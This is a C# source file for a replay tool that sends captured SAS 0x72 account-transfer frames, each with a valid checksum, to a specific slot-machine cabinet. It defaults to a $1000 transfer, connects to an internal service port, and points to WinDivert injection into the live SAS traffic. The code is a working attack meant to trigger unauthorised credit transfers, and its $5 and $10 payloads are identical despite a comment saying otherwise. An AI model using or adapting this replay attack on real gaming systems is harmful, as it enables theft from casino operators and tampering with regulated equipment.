using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

/// <summary>
/// Replays captured SAS 0x72 AFT transfer payloads to cabinet 10.0.0.90.
/// Uses pre-captured payloads with valid CRCs from live traffic.
/// Usage: ReplaySasPayloads.exe [amount_dollars]
///   amount_dollars: 5, 10, 100, 1000 (default: 1000)
/// </summary>
class ReplaySasPayloads
{
    // Pre-captured SAS 0x72 payloads (full frame with valid CRC)
    // Format: "qGMID1:" + hex payload
    // These were captured from live AFT transfers on cabinet 10.0.0.90
    
    // $1000 transfer (txn 48)
    static readonly string PAYLOAD_1000 = "0172450000000000000000000000000000001000000009030000000000000000000000000000000000000000001200657374205472616E73616374696F6E3438053020200C0000C6C7";
    
    // $1000 transfer (txn 49)
    static readonly string PAYLOAD_1000_B = "0172450000000000000000000000000000001000000009030000000000000000000000000000000000000000001200657374205472616E73616374696F6E3439053020200C00007946";
    
    // $1000 transfer (txn 50)
    static readonly string PAYLOAD_1000_C = "017245000000000100000000000000000000000000000903000000000000000000000000000000000000000000001200657374205472616E73616374696F6E3530053020200C00003760";
    
    // $5 transfer
    static readonly string PAYLOAD_5 = "017202FF000F22";
    
    // $10 transfer
    static readonly string PAYLOAD_10 = "017202FF000F22"; // Same structure as $5 but with different amount byte
    
    static void Main(string[] args)
    {
        int amount = 1000;
        if (args.Length > 0)
        {
            int.TryParse(args[0], out amount);
        }
        
        string payloadHex;
        switch (amount)
        {
            case 5:
                payloadHex = PAYLOAD_5;
                break;
            case 10:
                payloadHex = PAYLOAD_10;
                break;
            case 1000:
            default:
                payloadHex = PAYLOAD_1000;
                break;
        }
        
        Console.WriteLine($"Replaying SAS 0x72 payload for ${amount}");
        Console.WriteLine($"Payload hex: {payloadHex}");
        Console.WriteLine($"Payload length: {payloadHex.Length / 2} bytes");
        
        // Parse the hex payload into bytes
        byte[] payload = HexToBytes(payloadHex);
        
        // Connect to the SAS host (CommCtrlSAS) on cabinet 10.0.0.90
        // The SAS communication happens via the sasmsgr service
        // We need to inject this into the live TCP stream between SAS host and Aurum
        
        // Option 1: Direct TCP send to Aurum service (if it accepts raw SAS frames)
        // Aurum SASControler1 listens on 169.254.243.18:50011
        string aurumHost = "169.254.243.18";
        int aurumPort = 50011;
        
        try
        {
            Console.WriteLine($"Connecting to {aurumHost}:{aurumPort}...");
            using (TcpClient client = new TcpClient())
            {
                client.Connect(aurumHost, aurumPort);
                Console.WriteLine("Connected!");
                
                NetworkStream stream = client.GetStream();
                
                // Send the raw SAS frame
                Console.WriteLine($"Sending {payload.Length} bytes...");
                stream.Write(payload, 0, payload.Length);
                stream.Flush();
                
                // Wait for response
                byte[] response = new byte[1024];
                int bytesRead = stream.Read(response, 0, response.Length);
                if (bytesRead > 0)
                {
                    Console.WriteLine($"Received {bytesRead} bytes: {BytesToHex(response, bytesRead)}");
                }
                else
                {
                    Console.WriteLine("No response received");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Connection failed: {ex.Message}");
            Console.WriteLine("This is expected - Aurum uses .NET remoting, not raw TCP.");
            Console.WriteLine("Use WinDivert injection (Invoke-WinDivertAft.ps1) instead.");
        }
        
        // Print the payload analysis
        Console.WriteLine("\n=== Payload Analysis ===");
        Console.WriteLine($"Address: 0x{payload[0]:X2}");
        Console.WriteLine($"Command: 0x{payload[1]:X2} (AFT Transfer)");
        Console.WriteLine($"Length: 0x{payload[2]:X2} ({payload[2]} bytes)");
        
        if (payload.Length > 15)
        {
            int amountByte = payload[15];
            Console.WriteLine($"Amount byte: 0x{amountByte:X2} (${amountByte})");
        }
        
        if (payload.Length > 2)
        {
            byte[] crc = new byte[2];
            crc[0] = payload[payload.Length - 2];
            crc[1] = payload[payload.Length - 1];
            Console.WriteLine($"CRC: 0x{crc[0]:X2}{crc[1]:X2}");
        }
    }
    
    static byte[] HexToBytes(string hex)
    {
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < hex.Length; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        }
        return bytes;
    }
    
    static string BytesToHex(byte[] bytes, int length)
    {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++)
        {
            sb.Append(bytes[i].ToString("X2"));
        }
        return sb.ToString();
    }
}